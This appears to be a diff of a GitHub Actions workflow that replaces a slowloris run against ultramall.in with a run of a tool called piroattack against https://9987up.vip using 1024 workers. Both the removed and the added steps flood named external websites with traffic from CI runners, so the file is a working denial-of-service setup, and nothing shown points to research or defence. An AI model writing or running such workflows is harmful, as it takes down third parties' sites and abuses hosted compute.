@@ -20,8 +20,8 @@ jobs:
 
     - name: Install dependencies
       run: |
-        pip install slowloris
+        pip install piroattack
 
     - name: Run piroattack
       run: |
-        slowloris ultramall.in -s 4000
+        piroattack https://9987up.vip -m random -w 1024
